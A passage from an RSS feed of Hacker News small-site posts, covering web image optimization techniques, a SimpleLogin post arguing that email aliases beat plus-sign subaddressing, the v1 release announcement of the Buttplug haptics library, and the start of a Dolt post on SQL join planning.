loading.</p><p>To implement progressive enhancement for AVIF, use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>picture</code> element</a>.</p><p>The actual <code>img</code> element is nested in the <code>picture</code>. This can be quite confusing, because the <code>img</code> is sometimes described as fallback for browsers without picture support but basically the <code>picture</code> element only helps with <code>src</code> selection but has no layout itself. The element that is drawn (and which you style) is the <code>img</code> element.</p><p>Until very recently it was relatively difficult to actually encode AVIF images on the server-side, but with the latest version of libraries like <a href="https://github.com/lovell/sharp">sharp</a> it is now trivial.</p><pre><code><span><span><span>&lt;</span>picture</span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>source</span><br>    <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>    <span>srcset</span><span><span>=</span><span>"</span><br>      /img/Z1s3TKV-1920w.avif 1920w,<br>      /img/Z1s3TKV-1280w.avif 1280w,<br>      /img/Z1s3TKV-640w.avif   640w,<br>      /img/Z1s3TKV-320w.avif   320w<br>    <span>"</span></span><br>    <span>type</span><span><span>=</span><span>"</span>image/avif<span>"</span></span><br>  <span>/&gt;</span></span><br>  <br>  <span><span><span>&lt;</span>img</span> <span>/&gt;</span></span><br><span><span><span>&lt;/</span>picture</span><span>&gt;</span></span></code></pre><h2 id="load-the-right-number-of-pixels">Load the right number of pixels <a href="#load-the-right-number-of-pixels">#</a></h2><p>You might have noticed the <code>srcset</code> and <code>sizes</code> attributes in the snippet above. Using the <code>w</code> selector it tells the browser which URL to use based on the physical pixels that would be used if the image was drawn to the user's device given the width calculated from the <code>sizes</code> attribute (which is a media query expression).</p><p>With this the browser will always download the smallest possible image that provides the best image quality for the user. Or it may select a smaller image if, for example, the user has opted into some kind of data-saving mode.</p><h3 id="fallbacks">Fallbacks <a href="#fallbacks">#</a></h3><p>Provide more source elements with <code>srcset</code>s for browsers that only support legacy image formats.</p><pre><code><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.webp 1920w,<br>    /img/Z1s3TKV-1280w.webp 1280w,<br>    /img/Z1s3TKV-640w.webp   640w,<br>    /img/Z1s3TKV-320w.webp   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/webp<span>"</span></span><br><span>/&gt;</span></span><br><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.jpg 1920w,<br>    /img/Z1s3TKV-1280w.jpg 1280w,<br>    /img/Z1s3TKV-640w.jpg   640w,<br>    /img/Z1s3TKV-320w.jpg   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/jpeg<span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="caching-%2F-immutable-urls">Caching / Immutable URLs <a href="#caching-%2F-immutable-urls">#</a></h2><p>Embed a hash of the bytes in the image in the URL of the image. In the examples above I'm doing that with the <code>Z1s3TKV</code> in the image URLs. That way the URL will change if the image changes and respectively you can apply infinite cache expiration for your images. You want your caching headers to look something like this <code>cache-control: public,max-age=31536000,immutable</code>.</p><p><code>immutable</code> is the semantically correct <code>cache-control</code> value, but unfortunately it isn't widely supported in browsers (I'm looking at you, Chrome). <code>max-age=31536000</code> is the fallback to cache for a year. <code>public</code> is important to allow your CDN to cache the image and deliver it from the edge. But only use that if it is appropriate from a privacy perspective.</p><h2 id="lazy-loading">Lazy loading <a href="#lazy-loading">#</a></h2><p>Adding <code>loading="lazy"</code> to the <code>img</code> instructs the browser to only start fetching the image as it gets closer to the screen and is likely to actually be rendered.</p><pre><code><span><span><span>&lt;</span>img</span> <span>loading</span><span><span>=</span><span>"</span>lazy<span>"</span></span> <span>‚Ä¶</span> <span>/&gt;</span></span></code></pre><h2 id="asynchronous-decoding">Asynchronous decoding <a href="#asynchronous-decoding">#</a></h2><p>Adding <code>decoding="async"</code> to the <code>img</code> gives the browser permission to decode the image off the main thread avoiding user impact of the CPU-time used to decode the image. This should have no discernible downside except that it cannot always be the default for legacy reasons.</p><pre><code><span><span><span>&lt;</span>img</span> <span>decoding</span><span><span>=</span><span>"</span>async<span>"</span></span> <span>‚Ä¶</span> <span>/&gt;</span></span></code></pre><h2 id="blurry-placeholder">Blurry placeholder <a href="#blurry-placeholder">#</a></h2><p>A blurry placeholder is an inline image that provides the user some notion of the image that will load eventually without requiring fetching bytes from the network.</p><img alt="Sample blurry placeholder" height="853" src="https://www.industrialempathy.com/img/blurry.svg" width="1280"><p>Some notes on the implementation provided here:</p><ul><li>It inlines the blurry placeholder as a <code>background-image</code> of the image. This avoids using a second HTML element and it naturally hides the placeholder when the image loads, so that no JavaScript is needed to implement this.</li><li>It wraps the data URI of the actual image in a data URI of a SVG image. That is done because the blurring of the image is done at the SVG level instead of through a CSS filter. The result is that the blurring is only performed once per image when the SVG is rasterized, instead of on every layout saving CPU.</li></ul><pre><code><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      ‚Ä¶</span><br><span>      <span>background-size</span><span>:</span> cover<span>;</span></span><br><span>      <span>background-image</span><span>:</span> </span><br><span>        <span>url</span><span>(</span>'<span>data</span><span>:</span>image/svg+xml<span>;</span>charset=utf-8<span>,</span>%3Csvg xmlns=\'http%3A//www.w3.org/2000/svg\'</span><br><span>        xmlns%3Axlink=\'http%3A//www.w3.org/1999/xlink\' viewBox=\'0 0 1280 853\'%3E%3Cfilter id=\'b\' color-interpolation-filters=\'sRGB\'%3E%3CfeGaussianBlur stdDeviation=\'.5\'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type=\'discrete\' tableValues=\'1 1\'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter=\'<span><span>url</span><span>(</span>%23b<span>)</span></span>\' x=\'0\' y=\'0\' height=\'100%25\' width=\'100%25\' </span><br><span>        xlink%3Ahref=\<span>'data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAs0lEQVQI1wGoAFf/AImSoJSer5yjs52ktp2luJuluKOpuJefsoCNowB+kKaOm66grL+krsCnsMGrt8m1u8mzt8OVoLIAhJqzjZ2tnLLLnLHJp7fNmpyjqbPCqLrRjqO7AIeUn5ultaWtt56msaSnroZyY4mBgLq7wY6TmwCRfk2Pf1uzm2WulV+xmV6rmGyQfFm3nWSBcEIAfm46jX1FkH5Djn5AmodGo49MopBLlIRBfG8yj/dfjF5frTUAAAAASUVORK5CYII=\'%3E%3C/image%3E%3C/svg%3E'</span><span>)</span><span>;</span></span><br><span>    </span><span>"</span></span><br>  <span>‚Ä¶</span><br><span>/&gt;</span></span></code></pre><h3 id="(optional-ish)-javascript-optimization">(Optional-ish) JavaScript optimization <a href="#(optional-ish)-javascript-optimization">#</a></h3><p>Browsers may feel obliged to rasterize the blurry placeholder even if the image is already loaded. By removing it on image load, we solve that problem. Also, if your images contain transparency, then this is actually <em>not</em> optional as otherwise the placeholder would shine through.</p><pre><code><span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span><br>  document<span>.</span>body<span>.</span><span>addEventListener</span><span>(</span><br>    <span>"load"</span><span>,</span><br>    <span>(</span><span>e</span><span>)</span> <span>=&gt;</span> <span>{</span><br>      <span>if</span> <span>(</span>e<span>.</span>target<span>.</span>tagName <span>!=</span> <span>"IMG"</span><span>)</span> <span>{</span><br>        <span>return</span><span>;</span><br>      <span>}</span><br>      <br>      e<span>.</span>target<span>.</span>style<span>.</span>backgroundImage <span>=</span> <span>"none"</span><span>;</span><br>    <span>}</span><span>,</span><br>     <span>true</span><br>  <span>)</span><span>;</span><br></span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span></code></pre><p>This is a list of known technologies and tools implementing all of these optimizations:</p><ul><li><a href="https://github.com/google/eleventy-high-performance-blog">eleventy-high-performance-blog</a></li></ul><p>If you know of a technology (can be a combination of multiple "modules" or similar if they work well together) that should be on this list, please <a href="https://twitter.com/cramforce">ping me</a>.</p><share-widget></share-widget><p>Published <time datetime="2020-12-28">28 Dec 2020</time></p></article></div></div>]]>
            </description>
            <link>https://www.industrialempathy.com/posts/image-optimizations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563479</guid>
            <pubDate>Mon, 28 Dec 2020 21:34:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why email plus (+) trick isn't good for privacy (or why email alias is better)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25561797">thread link</a>) | @sonmicrosystems
<br/>
December 28, 2020 | https://simplelogin.io/blog/email-alias-vs-plus-sign/ | <a href="https://web.archive.org/web/*/https://simplelogin.io/blog/email-alias-vs-plus-sign/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
    <div>
        

        <div>
            <div>
                
                <p>
                    December 19, 2020 √Ç¬∑
                    written by <img src="https://simplelogin.io/logo-square.svg" alt="Author Image">
                    SimpleLogin team
                </p>
            </div>
        </div>

        

        

        <p><a href="https://en.wikipedia.org/wiki/Email_address#Subaddressing">Email subaddressing</a>, also known as plus sign (+) trick, is popularized by Gmail and now supported by most email providers. It allows creating a new email address by simply appending the plus sign(<strong>+</strong>) to your current email address.</p>
<p>For example, if your email address is <code>name@email.com</code>, you can quickly create a new email address like <code>name+facebook@email.com</code> for Facebook, <code>name+twitter@email.com</code> for Twitter, etc.</p>
<p>Here‚Äôs a closer look at the pros and cons of using the plus sign trick, especially when compared with email aliases.</p>

        

        

        <h3 id="plus-sign-trick-advantages">Plus sign trick advantages</h3>
<p>The main advantage of the plus sign trick is it‚Äôs easy to use and already available.</p>
<p>If you use email filters, email subaddressing is also very useful. For example, you can set up a filter to move all emails sent to <code>name+groupon@email.com</code> to the <strong>Promotion</strong> folder.</p>
<p>With subaddressing, you can create an unlimited number of email addresses: just add something after the plus sign and you√¢‚Ç¨‚Ñ¢ll have a new email address.</p>
<p>If you are a developer or work in QA, being able to quickly create a new email address is very helpful when testing a website or application.</p>
<h3 id="what-are-simplelogin-email-aliases">What are SimpleLogin email aliases?</h3>
<p>An email alias is simply a forwarding email address. Emails sent to an email alias are forwarded to your original email address.</p>
<p>Like the plus sign trick, SimpleLogin allows you to have a different email address for each website: just create a new email alias everytime you need an email address.</p>
<p>Usually an email alias only allows email forwarding but with SimpleLogin, you can also send emails or reply from your email alias.</p>
<p>Currently there are 4 ways of creating a new email alias in SimpleLogin:</p>
<ul>
<li>If you are on a laptop/PC, the <a href="https://addons.mozilla.org/firefox/addon/simplelogin/">Firefox</a> or <a href="https://chrome.google.com/webstore/detail/dphilobhebphkdjbpfohgikllaljmgbn">Chrome</a> extension allows creating a new email alias by clicking on the SimpleLogin icon in the email field. You can also use the right click menu to create a new email alias.</li>
</ul>
<p><img src="https://sldev.ovh/images/one-click-alias.gif" alt=""></p>
<ul>
<li>
<p>Using one of SimpleLogin apps: <a href="https://app.simplelogin.io/">website</a>, Firefox/Chrome extension popup or <a href="https://play.google.com/store/apps/details?id=io.simplelogin.android">Android</a>/<a href="https://apps.apple.com/app/id1494359858">iOS</a> app for more customization. This is the most flexible way and offers advanced options.</p>
</li>
<li>
<p>Creating email aliases on the fly via <strong>catch-all</strong> domain. If you own a domain, you can enable the catch-all option that allows you to use <code>can_be_anything@your-domain.com</code> as email address: it‚Äôs automatically created when an email is sent to this address.</p>
</li>
<li>
<p>Creating email aliases on the fly via <a href="https://simplelogin.io/blog/alias-directory/">directory</a>: this is actually similar to the plus sign trick. If you have a directory called <strong>newsletter</strong>, you can then use <code>newsletter+python@simplelogin.fr</code> when signing for a Python newsletter.</p>
</li>
</ul>
<h3 id="plus-sign-trick-email-address-isnt-good-for-privacy">Plus sign trick email address isn‚Äôt good for privacy</h3>
<p>Though practical, plus sign trick is well-known and your real email address can be easily extracted: one just needs to remove the part after the plus sign. For this reason, if your subaddress appears in an email leak (that you can easily verify on <a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a>), a bad actor can extract your real email address and uses it for a spam/phishing campaign or to match with other data breaches.</p>
<p>Email addresses that contain the plus sign are sometimes (incorrectly) considered invalid. Even worse, a website can silently drop the part after the plus sign and use your real email address instead.</p>
<p>If you use Gmail, you can‚Äôt also reply from the subaddress. When you reply to an email sent to a <code>name+newsletter@gmail.com</code>, the reply will come from your real email address <code>name@gmail.com</code></p>
<h3 id="email-aliases-protect-your-privacy">Email aliases protect your privacy</h3>
<p>An email alias is random and there‚Äôs no way to link 2 email aliases to the same person.</p>
<p>For email aliases created with a catch-all domain, they can only be linked together if the domain is known to have the catch-all option enabled. There‚Äôs no way to detect whether a domain has this option enabled or to know how many people are using a domain, a bad actor usually ignores these email addresses altogether.</p>
<p>For email aliases created via <strong>directory</strong>, you can use a different separator than the plus sign to reduce the chance of your email aliases being linked together. SimpleLogin also supports the hash sign (#) and the slash sign (/) as separator and in the future, you can also use directory as a subdomain (i.e. <code>newsletter.simplelogin.fr</code>). You can then either use <code>newsletter/python@simplelogin.fr</code>, <code>newsletter#python@simplelogin.fr</code> or <code>python@newsletter.simplelogin.fr</code> as email address.</p>
<h3 id="email-aliases-reveal-who-are-selling-your-data">Email aliases reveal who are selling your data</h3>
<p>If you use a different email alias for each website and one of your aliases starts receiving emails it isn‚Äôt supposed to receive, you can be sure that this alias is either leaked or sold.</p>
<p>For example, if your email alias for Facebook receives emails from LinkedIn, that means Facebook has sold your data to LinkedIn or they‚Äôve had a data breach. Either way, you can just disable this alias. Your real email address stays hidden.</p>
<p>Data brokers, <a href="https://www.webfx.com/blog/general/what-are-data-brokers-and-what-is-your-data-worth-infographic/">a $200 billion industry</a> use your email address as the common denominator to match users between different datasets. Having thousands of email addresses make their job harder and your privacy better.</p>
<h3 id="email-aliases-are-more-flexible">Email aliases are more flexible</h3>
<p>With email aliases, it‚Äôs easy to change where emails are forwarded. You can just add an additional mailbox so every email sent to your email aliases is forwarded to both mailboxes.</p>
<p>You can also have more complex setup like having an email alias for a shoping website that forwards to both your mailbox and your partner‚Äôs mailbox. Or an email alias for your support team that allows anyone to receive customer requests and reply from the support email address.</p>
<h3 id="additional-protection">Additional protection</h3>
<p>On popular email services like Gmail, Outlook, your emails are stored in plaintext, meaning anyone who has access to their servers can read your emails. Even though these services claim to have a strict policy in place and promise they would never read your emails, scandals in the past have shown otherwise. With the <a href="https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident.html">recent Twitter hack</a>, an employee can be social-engineered to leak the data or leave a backdoor for hackers.</p>
<p><a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">Pretty Good Privacy</a> (PGP) was created in 1991 as a way to encrypt your emails, texts, files, etc. Used by Edward Snowden, journalists, dissidents, ‚Ä¶ PGP is highly secure and almost unbreakable.</p>
<p>In PGP, you have 2 keys: the private key that allows you to decrypt the emails and that you should never lose. The public key is public (hence the name) that allows anyone who wants to send you an email to encrypt the email. Only you can then read the encrypted email.</p>
<p>SimpleLogin <a href="https://simplelogin.io/blog/introducing-pgp/">supports PGP</a> and allows you to use PGP on email services that don‚Äôt natively support it. For example, you can use PGP on your Gmail using browser extensions like <a href="https://www.mailvelope.com/en">Mailvelope</a> or <a href="https://flowcrypt.com/">FlowCrypt</a> and have SimpleLogin encrypting all emails sent to your Gmail.</p>
<h3 id="security">Security</h3>
<p>Though primarily focused on privacy, email aliases are a good way to increase your online security. Email address is usually used with password as account credential. If you use a different email alias for each website, a bad actor now needs to know both your password and the email alias in order to hack your account.</p>
<h3 id="recommendations">Recommendations</h3>
<p>With multiple advantages over plus sign trick, email aliases is a great tool to protect your online privacy. It‚Äôs recommended to use a password manager to help remember the email aliases used on different websites.</p>
<p><a href="https://app.simplelogin.io/auth/register">Sign up</a> for a new SimpleLogin account to explore how email aliases can help protect your online privacy. If you have used email aliases in the past, you might be surprised by how easy it becomes now ;).</p>


    </div>
</div></div>]]>
            </description>
            <link>https://simplelogin.io/blog/email-alias-vs-plus-sign/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561797</guid>
            <pubDate>Mon, 28 Dec 2020 18:38:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Buttplug (Sex Toy Control Library) Hits v1 Milestone]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 121 (<a href="https://news.ycombinator.com/item?id=25561392">thread link</a>) | @qdot76367
<br/>
December 28, 2020 | https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/ | <a href="https://web.archive.org/web/*/https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		
<p>After 3.5 years of development, <a href="https://buttplug.io/">Buttplug</a>, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it‚Äôs also the first real blog post on the new <a href="https://nonpolynomial.com/blog">Nonpolynomial Blog</a>!</p>



<figure><img loading="lazy" width="640" height="640" src="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png" alt="" srcset="https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w" sizes="(max-width: 640px) 100vw, 640px"></figure>



<p>For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a <a href="https://github.com/buttplugio/buttplug-rs">core Rust implementation</a> upon which the ecosystem can continue to grow.</p>



<p>Buttplug v1.0.0 is available in the following flavors:</p>



<ul><li>Rust ‚Äì <a href="https://crates.io/crates/buttplug">Crates.io</a>, <a href="https://github.com/buttplugio/buttplug-rs">Github</a></li><li>C# ‚Äì <a href="https://www.nuget.org/packages/Buttplug">Nuget</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li><li>JS/Typescript (via WASM, Web-only currently) ‚Äì <a href="https://www.npmjs.com/package/buttplug">NPM</a>, <a href="https://github.com/buttplugio/buttplug-rs-ffi">Github</a></li></ul>



<p>The <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> covers basic usage, with examples in all of the aforementioned languages.</p>



<h2>What Even Is Buttplug?</h2>



<p><a href="https://buttplug.io/">Buttplug</a> is a haptics abstraction library for intimate hardware. </p>



<p>Which is a fancy way of saying ‚Äúa way of telling a bunch of different vibrators how to vibrate‚Äù. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.</p>



<p>Basically, there are <a href="https://iostindex.com/">hundreds of computer controlled sex toys out there</a>. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like ‚Äúvibrate/rotate at [speed]‚Äù. That‚Äôs it.</p>



<p>While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it‚Äôs not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like <a href="https://www.chai3d.org/">Chai3D</a> and <a href="https://h3dapi.org/">H3D</a> work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like <a href="https://vrpn.github.io/">VRPN</a> work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn‚Äôt get much engineering attention. This leads to many interesting questions, like:</p>



<ul><li>How do we quickly and reliably bring up hardware communication across multiple platforms?</li><li>How do we interact with a user whose affective state may differ from someone using ‚Äúnormal‚Äù software like a word processor or database?</li><li>How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?</li><li>What are the <a href="https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html">ethical implications of building open source technology for intimacy</a>?</li><li>Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?</li></ul>



<p>We‚Äôve heard from our community that some users are just interested in controlling sex toys, though, and that‚Äôs fine too. I guess.</p>



<p>If you‚Äôre curious about what users are doing with Buttplug, <a href="https://github.com/buttplugio/awesome-buttplug">check out our awesome-buttplug project list repo</a>.</p>



<h2>A Short-ish History of Buttplug</h2>



<p>Here‚Äôs an overview of the 16 year path from my start in sex tech to a v1 library for the field.</p>



<ul><li>2004<ul><li><a href="https://kyle.machul.is/">Kyle</a> starts <a href="https://metafetish.com/">Slashdong (which became Metafetish, now defunct)</a> to write about sex tech engineering.</li></ul></li><li>2007<ul><li><a href="https://youtu.be/FRLygav4tcs">Kyle gives a presentation at Arse Elektronika mentioning ‚ÄúObfuscated Macros‚Äù</a>, which at the time seemed like a great name because Kyle was a 20-something engineer. This idea would grow to become the basis of Buttplug.</li></ul></li><li>2013<ul><li><a href="https://github.com/buttplugio/buttplug-py-deprecated">First Python implementation, known as ‚ÄúFuck Everything‚Äù.</a> Uses ZeroMQ and Python 2. Never full shipped due to issues with python application redistribution, as well as lack of hardware on the market to support.</li></ul></li><li>Fall 2016<ul><li><a href="https://github.com/buttplugio/buttplug-rs">First Rust implementation.</a> Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.</li></ul></li><li>April 2017<ul><li><a href="https://github.com/buttplugio/buttplug-csharp">First C# implementation, using the recently released UWP BTLE APIs for Windows.</a> Library gains momentum and project takes off, also establishing a <a href="https://buttplug-protocol-spec.docs.buttplug.io/">protocol spec</a> to ensure compatibility between versions.</li></ul></li><li>May 2017<ul><li><a href="https://github.com/buttplugio/buttplug-js">First JS implementation</a>, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using <a href="https://github.com/noble/noble">noble</a> and other hardware libraries.</li></ul></li><li>August 2017<ul><li>Kyle incorporates <a href="https://nonpolynomial.com/">Nonpolynomial</a></li></ul></li><li>December 2017<ul><li>Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.</li></ul></li><li>April 2019<ul><li><a href="https://github.com/buttplugio/buttplug-py">Python implementation of Client API for Buttplug.</a> All hardware access was still managed via either JS or C# implementations.</li></ul></li><li>May 2019<ul><li>Established the <a href="https://intiface.com/">Intiface brand</a> for Buttplug applications developed by <a href="https://nonpolynomial.com/">Nonpolynomial</a>.</li></ul></li><li>Sept 2019<ul><li>Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.</li></ul></li><li>January 2020<ul><li>Forked <a href="https://github.com/mwylde/rumble">Rumble</a> into <a href="https://github.com/deviceplug/btleplug">btleplug</a> (begrudgingly changing the name because rumble would‚Äôve been GREAT to have in Buttplug but the original author was AWOL so package couldn‚Äôt be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.</li></ul></li><li>October 2020<ul><li>Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. <a href="https://github.com/buttplugio/buttplug-rs-ffi">Move to porting C#/JS to using Rust via FFI</a>. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.</li></ul></li><li>December 2020<ul><li>v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. <a href="https://buttplug-developer-guide.docs.buttplug.io/">Buttplug Developer Guide</a> in good enough shape to guide users on building simple Buttplug Applications. <a href="https://metafetish.com/">Metafetish</a> closes after 16 years in order to make way for new <a href="https://nonpolynomial.com/blog">Nonpolynomial blog</a>.</li></ul></li></ul>



<h2>What Buttplug Version 1 Means</h2>



<p>To me, a lot. To you, possibly not so much.</p>



<p>As mentioned, Buttplug Version 1 doesn‚Äôt really come with a lot of new features. It‚Äôs mostly a point where I can cut old stuff and start looking toward the future.</p>



<p><a href="https://github.com/buttplugio/buttplug-csharp">Buttplug C#</a> and <a href="https://github.com/buttplugio/buttplug-js">Buttplug JS</a> will now be archived, as implementations now live in our <a href="https://github.com/buttplugio/buttplug-rs-ffi">FFI repo</a>, and their respective <a href="https://www.nuget.org/packages/Buttplug/">nuget</a> and <a href="https://www.npmjs.com/package/buttplug">npm</a> packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you‚Äôve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.</p>



<p>Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that‚Äôs fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.</p>



<p>Success will be measured via this possible reduction of rote coding work. I‚Äôd like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.</p>



<p>The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it‚Äôs probably the last time it‚Äôll happen.</p>



<h2>What‚Äôs Next</h2>



<p>There‚Äôs so many directions to go now that it‚Äôs almost hard to pick which to start with, but here‚Äôs some general ideas of what I‚Äôd like to do next:</p>



<ul><li>Blog Posts<ul><li>I have this shiny new blog now and I‚Äôd like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I‚Äôm using that I‚Äôd like to cover here.</li></ul></li><li>Documentation<ul><li>Buttplug v1 is documented just enough to maybe get people started, but the <a href="https://buttplug-developer-guide.docs.buttplug.io/">developer guide</a> and API documentation for the various implementations definitely need more love.</li></ul></li><li>More FFI Implementations<ul><li>Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.</li></ul></li><li>Application Updates<ul><li>I maintain a few applications, like <a href="https://intiface.com/desktop">Intiface Desktop</a> and the <a href="https://intiface.com/ghr">Game Haptics Router</a>, that have been backburnered while v1 was in progress. Would really like to get those updated and add some new features. Also need to update dependent libraries, like our <a href="https://github.com/buttplugio/buttplug-unity">Unity Game Engine</a> and <a href="https://github.com/buttplugio/buttplug-twine">Twine Game Engine</a> support.</li></ul></li><li>Hardware Support<ul><li>The v1 slog (this was supposed to be done in October, then <a href="https://www.supergiantgames.com/games/hades/">Hades</a> happened. Oops.) means hardware support for things like the <a href="https://patreon.com/tempestvr">OSR2</a> and <a href="https://github.com/buttplugio/buttplug-rs/issues/151">Nintendo Joycon</a> are still in development and running behind.</li></ul></li><li>Actually Making New Stuff<ul><li>Everything listed so far is continued maintenance. It‚Äôd be nice to actually make some new things too. Don‚Äôt know what those will be, but I need to actually create with my creation, instead of just creating my creation.</li></ul></li></ul>



<h2>Thanks</h2>



<p>Thanks go to:</p>



<ul><li>Loved ones and friends who‚Äôve had to put up with me being ‚ÄúThe Buttplug Guy‚Äù for the past 16 years (with no sign of that ending soon).</li><li>My <a href="https://patreon.com/qdot">Patreon</a> and <a href="https://github.com/sponsors/qdot">Github Sponsors</a> Subscribers, who‚Äôve kept the project funded enough for me to buy new hardware.</li><li>My consulting clients for <a href="https://nonpolynomial.com/">Nonpolynomial</a>, who‚Äôve helped keep the business cash positive while also helping my project along with support in their products.</li><li>Everyone who worked on reverse engineering toys and donating info to our <a href="https://stpihkal.docs.buttplug.io/">Sex Toys Protocols I Have Known And Loved (STPIHKAL) </a>documentation project.</li><li>Sex tech projects like <a href="https://iostindex.com/">IOSTI‚Ä¶</a></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/">https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</a></em></p>]]>
            </description>
            <link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561392</guid>
            <pubDate>Mon, 28 Dec 2020 18:01:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing join planning in our open source Golang SQL query engine]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25561173">thread link</a>) | @zachmu
<br/>
December 28, 2020 | https://www.dolthub.com/blog/2020-12-28-join-planning/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-12-28-join-planning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text">
<p><a href="https://github.com/dolthub/dolt/">Dolt</a> is Git for Data. It's a SQL
database that you can clone, fork, branch, and merge. Dolt's SQL
engine is
<a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>, and
today we're going to discuss how it implements join planning to make a
query plan involving multiple tables as efficient as possible.</p>

<p>When a query involves more than one table, there are many different
ways to access those tables to get a correct result. But some ways are
much faster than others! Choosing an order to access tables in and a
strategy to assemble result rows is known as join planning. This is
easiest to explain with an example.</p>
<p>Let's create three tables to track the populations of cities and
states, and the people who live in them. If you have Dolt installed
(link in the sidebar), you can follow along.</p>
